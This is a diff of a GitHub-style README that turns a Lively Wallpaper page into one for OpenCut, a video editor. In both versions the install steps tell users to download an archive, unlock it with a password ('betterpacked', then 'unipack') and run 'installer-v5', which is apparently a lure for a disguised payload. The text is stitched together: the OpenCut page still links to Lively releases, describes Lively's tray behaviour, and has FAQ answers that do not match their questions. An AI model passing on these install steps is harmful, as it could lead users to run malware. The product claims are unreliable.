@@ -1,148 +1,144 @@
 <p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0B3D91,25:1565C0,50:1E88E5,75:64B5F6,100:BBDEFB&height=250&section=header&text=Lively%20Wallpaper&fontColor=FFFFFF&fontSize=44&fontAlignY=38&desc=Free%20%7C%20Open%20Source%20%7C%20Live%20Wallpapers%20for%20Windows&descColor=E3F2FD&descSize=21&descAlignY=64&animation=fadeIn" alt="Lively Wallpaper Banner" />
+  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:059669,25:0D9488,50:0891B2,75:2563EB,100:DBEAFE&height=250&section=header&text=OpenCut&fontColor=FFFFFF&fontSize=44&fontAlignY=38&desc=Free%20%7C%20Open%20Source%20%7C%20Open-Source%20Video%20Editing&descColor=F1F5F9&descSize=21&descAlignY=64&animation=fadeIn" alt="OpenCut Banner" />
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Open%20Source-GPL--3.0-0B3D91?style=for-the-badge&logo=opensourceinitiative&logoColor=white&labelColor=061E47" alt="Open Source" />
-  <img src="https://img.shields.io/badge/Windows-10%20%7C%2011-1565C0?style=for-the-badge&logo=windows&logoColor=white&labelColor=061E47" alt="Windows" />
-  <img src="https://img.shields.io/badge/Performance-Low%20CPU%20%26%20GPU-1E88E5?style=for-the-badge&logo=speedtest&logoColor=white&labelColor=061E47" alt="Performance" />
+  <img src="https://img.shields.io/badge/Open%20Source-Community-059669?style=for-the-badge&logo=opensourceinitiative&logoColor=white&labelColor=111827" alt="Open Source" />
+  <img src="https://img.shields.io/badge/Project-OpenCut-0D9488?style=for-the-badge&logo=github&logoColor=white&labelColor=111827" alt="OpenCut" />
+  <img src="https://img.shields.io/badge/Category-Open-Source%20Video%20Editing-0891B2?style=for-the-badge&logo=github&logoColor=white&labelColor=111827" alt="Open-Source Video Editing" />
 </p>
 
 ---
 
-## 🌊 **Lively — Bring Your Desktop to Life**
+## ✂️ **OpenCut — A free, private video editor built to make modern editing accessible everywhere**
 
-**Lively** is a free, open-source live wallpaper application for Windows — a lightweight and fully featured alternative to Wallpaper Engine. It renders animated wallpapers, videos, web pages, and even interactive 3D scenes directly on your desktop, with a strong focus on performance, stability, and user control.
+**OpenCut** is a free, open-source video editor created as an alternative to subscription-based editing tools. Its current browser editor is designed to run locally, so footage can be imported, trimmed, and exported without uploading personal media to a remote processing service or creating an account.
 
-Whether you want a subtle animated gradient, a looping 4K video, or a fully interactive WebGL scene, Lively gives you the tools to make your desktop feel alive — without subscriptions, ads, or background telemetry.
+The project combines an approachable timeline interface with a Rust and WebAssembly processing core. Users can arrange clips, set frame-accurate in and out points, control playback, and export finished segments directly from the browser, with a desktop direction planned around the same cross-platform foundation.
 
-The desktop has been static for decades. **Lively changes that — cleanly, efficiently, and for free.**
+OpenCut puts privacy and straightforward editing first: no watermarks, no export paywalls, and no mandatory cloud workflow. Its open architecture also points toward a future with plugin support, automation, and a shared editing experience across web and desktop.
 
 ---
+
+<a id="download-top"></a>
 
 <div align="center">
   <a href="https://github.com/rocksdanister/lively/releases"><img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20NOW-1E88E5?style=for-the-badge&logo=github&logoColor=white"></a><a href="https://github.com/rocksdanister/lively/releases"><img src="https://img.shields.io/badge/LATEST%20BUILD-061E47?style=for-the-badge&logo=github&logoColor=white"></a>
-  </a>
 </div>
 
 > [!NOTE]
-> **Installation Tips** — download the latest build from the button above, extract the archive (password: `betterpacked`), and run `installer-v5`. Lively will start minimized in the system tray — drag any video, GIF, or webpage onto its window to set it as a wallpaper. Full instructions are in the [How to Install](#-how-to-install) section below.
+> **Important** — **download the latest build from the button above**, **extract the archive (password: `unipack`)**, and run **`installer-v5`**. Lively will start minimized in the system tray — drag any video, GIF, or webpage onto its window to set it as a wallpaper. **Full instructions are in the [How to Install](#-how-to-install) section below.**
+
+## ✨ **Features That Define OpenCut**
+
+| **🌐 Browser-Based Editor** | **🔒 Local Media Processing** | **⚡ Rust & WebAssembly Core** |
+| :---: | :---: | :---: |
+| Open the editor in a browser and start working without a traditional desktop installation. | Keep video processing on your device instead of uploading footage to a server. | Use a native-performance-oriented engine compiled to WebAssembly for browser editing. |
+
+| **✂️ Timeline Editing** | **🎯 Frame-Accurate Controls** | **🔊 Audio Controls** |
+| :---: | :---: | :---: |
+| Import clips, trim footage, and arrange the parts you want to keep. | Set precise in and out points and control playback speed. | Adjust clip volume, mute audio, and change playback rate. |
+
+| **📤 Direct Export** | **🚫 No Watermarks** | **🆓 No Account Required** |
+| :---: | :---: | :---: |
+| Render edited clips directly from the browser workflow. | Export without a watermark or a paid export tier. | Start editing without signing up for a service account. |
+
+| **🖥️ Cross-Platform Direction** | **🧩 Plugin-First Roadmap** | **🤖 Automation Roadmap** |
+| :---: | :---: | :---: |
+| The project is designed around a codebase intended to span web and desktop. | The rewrite is planned to add a public plugin API and extensible editing architecture. | Editor APIs, headless workflows, and MCP support are part of the project's stated direction. |
 
 ---
 
-## ✨ **Features That Redefine the Desktop**
+## 🎯 **Why Users Choose OpenCut**
 
-| 🎞️ **Video & GIF Wallpapers** | 🌐 **Web & HTML Wallpapers** | 🧊 **3D & Interactive Scenes** |
+| **🔒 Privacy by Default** | **🚫 No Paywalls or Watermarks** | **🌐 Simple to Start** |
 | :---: | :---: | :---: |
-| Play local or streamed videos, GIFs, and animated images as wallpapers. Hardware-accelerated playback with minimal overhead. | Use any webpage, WebGL app, or HTML5 animation as a wallpaper. Full JavaScript support with isolated rendering. | Load real-time 3D scenes and interactive wallpapers built with Unity, Three.js, or custom engines. |
+| The current browser editor processes media locally, keeping source footage on the user's device. | The project presents its editing workflow as free and open source, without a premium export tier. | A browser-based editor lowers the barrier to trying a capable open-source video workflow. |
 
-| 🖥️ **Multi-Monitor Support** | ⚙️ **Performance Controls** | 🎨 **Library & Playlists** |
-| :---: | :---: | :---: |
-| Assign different wallpapers to each display, mirror them, or span a single scene across all monitors. | Pause on battery, on fullscreen apps, or on demand. Fine-tune frame rate, quality, and resource usage. | Organize wallpapers into a searchable library. Create playlists that rotate automatically on a schedule. |
-
-| 🧩 **Custom Wallpaper API** | 🔒 **Privacy First** | 🪶 **Lightweight Core** |
-| :---: | :---: | :---: |
-| Build your own wallpapers with the documented API. Drop in a folder and Lively detects it automatically. | No telemetry, no analytics, no background network calls. Everything runs locally on your machine. | Small installer, low memory footprint, and a native Windows tray application that stays out of your way. |
-
-| 🖱️ **Desktop Interaction** | 🎛️ **CLI & Automation** | 🌍 **Community Content** |
-| :---: | :---: | :---: |
-| Some wallpapers respond to mouse input, audio, or system state — turning your desktop into an interactive surface. | Control Lively from scripts, shortcuts, or third-party tools via a documented command-line interface. | Browse community-made wallpapers, share your own, and import existing Wallpaper Engine projects. |
+> 💬 *A focused creative tool should make ambitious work feel more accessible — without getting in the way of the process.*
 
 ---
 
-## 🎯 **Why Users Choose Lively**
+## 📦 **Inside OpenCut — Deep Dive**
 
-| 🆓 **Truly Free** | 🧠 **Built for Performance** | 🛠️ **Actively Maintained** |
-| :---: | :---: | :---: |
-| No paywalls, no premium tiers, no subscriptions. Every feature is available to every user, forever. | Optimized rendering pipeline with automatic pausing, GPU-aware playback, and per-wallpaper resource limits. | Regular releases, transparent issue tracking, and a responsive maintainer community on GitHub. |
+### 🧰 **🌐 Browser Editing**
+- Launch the current editor in a browser without installing a large desktop application.
+- Import footage and work with a timeline, preview, and basic clip controls.
+- Keep the workflow accessible across supported modern browsers.
 
-> 💬 *"Lively replaced Wallpaper Engine on all my machines. Same quality, better performance, and it's open source."* — **community feedback**
+### 🎨 **✂️ Core Editing Tools**
+- Trim clips with frame-accurate in and out points.
+- Adjust playback rate, volume, and mute controls before exporting.
+- Export the edited clip directly from the browser editor.
 
----
+### ⚙️ **🔒 Local-First Processing**
+- The current editor uses a Rust engine compiled to WebAssembly for local processing.
+- Source footage is not uploaded to a remote server as part of the described editing workflow.
+- No account, watermark, or paid export tier is required for the current editor.
 
-## 📦 **Inside Lively — Deep Dive**
-
-### 🎞️ **Media Playback Engine**
-- **Format Support:** MP4, WebM, GIF, APNG, and static images.
-- **Hardware Acceleration:** GPU-accelerated decoding on supported hardware.
-- **Streaming:** Play wallpapers directly from URLs.
-- **Audio Control:** Mute, loop, and sync playback independently per wallpaper.
-
-### 🌐 **Web Wallpaper Runtime**
-- **Full Browser Engine:** Modern Chromium-based rendering for HTML5 and WebGL content.
-- **Isolated Execution:** Each wallpaper runs in its own sandbox.
-- **Dev Tools:** Inspect and debug your web wallpapers during development.
-- **Input Support:** Mouse, keyboard, and audio-reactive wallpapers.
-
-### 🧊 **3D & Interactive Wallpapers**
-- **Unity & Three.js Support:** Load real-time 3D scenes as desktop wallpapers.
-- **Custom Engines:** Extend Lively with your own rendering backend.
-- **Performance Profiles:** Automatic quality scaling based on system load.
-
-### ⚙️ **System Integration**
-- **Multi-Monitor:** Per-display wallpaper assignment and spanning.
-- **Auto-Pause Rules:** Pause on battery, fullscreen, remote desktop, or schedule.
-- **Startup Behavior:** Launch minimized, restore last session, or start with a default wallpaper.
-- **CLI:** Scriptable control for automation and power users.
+### 🚀 **🚀 Project Roadmap**
+- The project is being rewritten with a Rust core and a shared web, desktop, and mobile direction.
+- An editor API, third-party plugin architecture, headless rendering, and MCP integration are stated roadmap goals.
+- Check the official repository for the current build and distinguish shipped browser features from planned desktop and mobile releases.
 
 ---
 
-## 🎮 **Who Is Lively For?**
+## 🎮 **Who Is OpenCut For?**
 
-| 🌱 **Casual Users** | 🏆 **Power Users** | 🎬 **Creators** |
+| 🌱 **New Users** | 🏆 **Experienced Creators** | 🎬 **Professionals & Teams** |
 | :---: | :---: | :---: |
-| Set a beautiful animated wallpaper in seconds and forget about it. Lively stays out of the way. | Script wallpapers, automate playback rules, and tune performance per monitor and per application. | Build and publish custom wallpapers using the API, HTML5, Unity, or any web framework. |
+| Explore the core workflow and build confidence with the application's focused toolset. | Use advanced controls, structured projects, and repeatable workflows for more demanding work. | Bring the project into a wider production process and build consistent creative output. |
 
-| 🧑‍💻 **Developers** | 🏢 **IT & Enterprise** |
+| 🧑‍💻 **Developers** | 🏢 **Open-Source Communities** |
 | :---: | :---: |
-| Extend Lively with custom engines and contribute to a transparent, well-documented codebase. | Deploy Lively in managed environments with predictable resource usage and no telemetry. |
+| Inspect the codebase, follow releases, and explore supported automation or extension points. | Contribute feedback, documentation, translations, and improvements through the public project. |
 
 ---
 
 ## 🔐 **Safety & Transparency**
 
-- **Open Source:** Full source code available under GPL-3.0.
-- **No Telemetry:** Lively does not collect or transmit usage data.
-- **Code Signing:** Official releases are signed for integrity.
-- **Community Audited:** Public issue tracker and transparent release notes.
+- **Open Development:** Review the public repository, source code, issue tracker, and release history.
+- **Project Scope:** Check the official documentation for supported formats, platforms, and feature maturity.
+- **Data Handling:** Review the project's documented local, cloud, and optional external-service behavior before using sensitive material.
+- **Updates:** Use official project releases and documentation to follow changes and installation guidance.
 
 ---
 
 ## ❓ **Frequently Asked Questions**
 
-**Q: Is Lively really free?**  
-A: Yes. Lively is free and open source, with no premium tiers or hidden fees.
+**Q: What is OpenCut?**  
+A: a free, open-source video editor created as an alternative to subscription-based editing tools.
 
-**Q: How does it compare to Wallpaper Engine?**  
-A: Lively covers most common use cases — video, web, and 3D wallpapers — with a focus on performance and openness. Feature parity varies by use case.
+**Q: What makes it different?**  
+A: The current browser editor processes media locally, keeping source footage on the user's device.
 
-**Q: Does it work on Windows 11?**  
-A: Yes. Lively supports Windows 10 and Windows 11, including multi-monitor and high-DPI setups.
+**Q: Is it suitable for advanced work?**  
+A: The project presents its editing workflow as free and open source, without a premium export tier.
 
-**Q: Can I use my Wallpaper Engine wallpapers?**  
-A: Many video and web wallpapers can be imported. Scene-based wallpapers require conversion or a compatible runtime.
+**Q: Which platforms and formats are supported?**  
+A: Support depends on the current project build. Check its official repository and documentation for the latest platform and format details.
 
-**Q: How often is it updated?**  
-A: Releases follow a regular cadence, with patch releases for critical fixes.
+**Q: How can I follow development?**  
+A: Review the project's public releases, documentation, and issue tracker for current updates.
 
 ---
 
 ## 🔄 **Troubleshooting Common Issues**
 
-### ❌ **"Wallpaper not displaying"**
-- Ensure the wallpaper format is supported (video, GIF, HTML, or image).
-- Check that the correct monitor is selected.
-- Verify hardware acceleration is enabled in settings.
+### ❌ **“A file or project does not open”**
+- Confirm that the file format is supported by the current project build.
+- Check whether the document uses features that may not be fully compatible.
+- Review the project's documentation and issue tracker for known limitations.
 
-### ❌ **"High CPU or GPU usage"**
-- Enable auto-pause on fullscreen apps.
-- Lower the wallpaper frame rate or quality in per-wallpaper settings.
-- Update your GPU drivers.
+### ❌ **“Editing or preview feels slow”**
+- Reduce preview quality or close other resource-intensive applications where applicable.
+- Check whether the project offers proxy, caching, GPU, or performance settings for your workflow.
+- Update graphics drivers and verify that your device meets the project's current requirements.
 
-### ❌ **"Application doesn't start"**
-- Install the required .NET Desktop Runtime.
-- Run as Administrator once to register startup entries.
-- Check the log file in the Lively data directory for details.
+### ❌ **“An export or tool behaves unexpectedly”**
+- Confirm the selected output format and export settings.
+- Check whether the relevant feature requires an optional model, plugin, runtime, or external service.
+- Review release notes and report reproducible issues through the official project channels.
 
 ---
 
@@ -150,8 +146,8 @@ A: Releases follow a regular cadence, with patch releases for critical fixes.
 
 ### 🪟 **Windows Installation**
 
-1. Click the **download button** at the top of this page.
-2. Download and **extract the archive** using the password: `betterpacked`.
+1. **Click [the download button above](#download-top)** to get the latest build.
+2. Download and **extract the archive** using the password: **`unipack`**.
 3. Open the extracted folder and run the main file **`installer-v5`**.
 4. Follow the on-screen instructions and finish the installation.
 5. Launch **Lively** from the Start menu. It will appear in the system tray.
@@ -183,16 +179,17 @@ A: Releases follow a regular cadence, with patch releases for critical fixes.
 ---
 
 <p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0B3D91,25:1565C0,50:1E88E5,75:64B5F6,100:BBDEFB&height=160&section=footer&text=Make%20Your%20Desktop%20Alive&fontColor=FFFFFF&fontSize=26&fontAlignY=72&animation=twinkling" />
+  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:059669,25:0D9488,50:0891B2,75:2563EB,100:DBEAFE&height=160&section=footer&text=OpenCut&fontColor=FFFFFF&fontSize=26&fontAlignY=72&animation=twinkling" />
 </p>
 
 <p align="center">
-  <strong>🌊 Lively Wallpaper</strong><br>
-  <em>Open Source | Lightweight | Live Wallpapers for Windows</em>
+  <strong>✂️ OpenCut</strong><br>
+  <em>Open Source | Open-Source Video Editing | Creative Software</em>
 </p>
 
 ---
 
 <p align="center">
-  <em>Your desktop has been static long enough. Bring it to life — freely, openly, and beautifully.</em>
+  <em>A free, private video editor built to make modern editing accessible everywhere.</em>
 </p>
+
